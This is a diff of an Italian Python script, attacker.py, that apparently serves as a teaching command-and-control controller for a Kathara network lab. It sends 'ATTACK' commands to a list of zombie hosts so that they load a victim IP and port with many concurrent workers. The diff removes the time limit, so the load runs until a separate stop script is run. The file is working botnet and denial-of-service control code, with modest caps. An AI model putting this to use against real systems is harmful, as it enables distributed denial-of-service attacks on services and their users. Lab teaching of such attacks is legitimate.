@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 """
 attacker.py - controller C2 didattico per laboratorio Kathara.
-Invia agli zombie un comando di carico controllato e limitato nel tempo.
+Invia agli zombie un comando di carico controllato che resta attivo fino a STOP.
 
 Uso nel container attacker:
-  python3 /hostlab/attacker.py <IP_VITTIMA> <PORTA> [conn_per_zombie] [durata_sec]
+  python3 /hostlab/attacker/attacker.py <IP_VITTIMA> <PORTA> [workers_per_zombie] [delay_sec]
 """
 import os
 import socket
@@ -12,11 +12,12 @@ import sys
 import threading
 
 ZOMBIE_PORT = 9999
-ZOMBIES_PATHS = ("/hostlab/zombies.txt", "/zombies.txt", "zombies.txt")
-DEFAULT_CONNECTIONS = 30
-DEFAULT_DURATION = 60
-MAX_CONNECTIONS_PER_ZOMBIE = 100
-MAX_DURATION = 180
+ZOMBIES_PATHS = ("/hostlab/attacker/zombies.txt", "/hostlab/zombies.txt", "/zombies.txt", "zombies.txt")
+DEFAULT_WORKERS = 30
+DEFAULT_DELAY = 0.01
+MAX_WORKERS_PER_ZOMBIE = 100
+MIN_DELAY = 0.0
+MAX_DELAY = 2.0
 
 
 def find_zombies_file() -> str | None:
@@ -41,10 +42,25 @@ def bounded_int(value: str, default: int, minimum: int, maximum: int, label: str
     return number
 
 
-def send_attack_command(zombie_ip: str, target_ip: str, target_port: int, connections: int, duration: int) -> None:
+def bounded_float(value: str, default: float, minimum: float, maximum: float, label: str) -> float:
+    if value is None:
+        return default
+    try:
+        number = float(value)
+    except ValueError:
+        raise ValueError(f"{label} deve essere un numero")
+    if number < minimum:
+        raise ValueError(f"{label} deve essere >= {minimum}")
+    if number > maximum:
+        print(f"[WARN] {label} ridotto da {number} a {maximum} per mantenere il test controllato")
+        number = maximum
+    return number
+
+
+def send_attack_command(zombie_ip: str, target_ip: str, target_port: int, workers: int, delay: float) -> None:
     try:
         with socket.create_connection((zombie_ip, ZOMBIE_PORT), timeout=4) as s:
-            command = f"ATTACK {target_ip} {target_port} {connections} {duration}\n"
+            command = f"ATTACK {target_ip} {target_port} {workers} {delay}\n"
             s.sendall(command.encode())
             try:
                 reply = s.recv(1024).decode(errors="ignore").strip()
@@ -57,13 +73,13 @@ def send_attack_command(zombie_ip: str, target_ip: str, target_port: int, connec
 
 def main() -> int:
     if len(sys.argv) < 3:
-        print("Uso: python3 /hostlab/attacker.py <IP_VITTIMA> <PORTA> [conn_per_zombie] [durata_sec]")
+        print("Uso: python3 /hostlab/attacker/attacker.py <IP_VITTIMA> <PORTA> [workers_per_zombie] [delay_sec]")
         return 1
 
     target_ip = sys.argv[1]
     target_port = int(sys.argv[2])
-    connections = bounded_int(sys.argv[3] if len(sys.argv) >= 4 else None, DEFAULT_CONNECTIONS, 1, MAX_CONNECTIONS_PER_ZOMBIE, "conn_per_zombie")
-    duration = bounded_int(sys.argv[4] if len(sys.argv) >= 5 else None, DEFAULT_DURATION, 1, MAX_DURATION, "durata_sec")
+    workers = bounded_int(sys.argv[3] if len(sys.argv) >= 4 else None, DEFAULT_WORKERS, 1, MAX_WORKERS_PER_ZOMBIE, "workers_per_zombie")
+    delay = bounded_float(sys.argv[4] if len(sys.argv) >= 5 else None, DEFAULT_DELAY, MIN_DELAY, MAX_DELAY, "delay_sec")
 
     zombies_file = find_zombies_file()
     if not zombies_file:
@@ -79,18 +95,19 @@ def main() -> int:
         return 1
 
     print(f"[INFO] Zombie letti da {zombies_file}: {', '.join(zombies)}")
-    print(f"[INFO] Target: {target_ip}:{target_port}; carico: {connections} connessioni/zombie per {duration}s")
+    print(f"[INFO] Target: {target_ip}:{target_port}; workers/zombie: {workers}; delay: {delay}s")
+    print("[INFO] Il carico resta attivo finché non esegui zombies_stop.py")
 
     threads = []
     for zombie_ip in zombies:
-        t = threading.Thread(target=send_attack_command, args=(zombie_ip, target_ip, target_port, connections, duration), daemon=True)
+        t = threading.Thread(target=send_attack_command, args=(zombie_ip, target_ip, target_port, workers, delay), daemon=True)
         t.start()
         threads.append(t)
 
     for t in threads:
         t.join()
 
-    print("[OK] Comandi inviati. Verifica sui singoli zombie: tail -f /tmp/zombie.log")
+    print("[OK] Comandi inviati. Stop: python3 /hostlab/attacker/zombies_stop.py")
     return 0
 
 
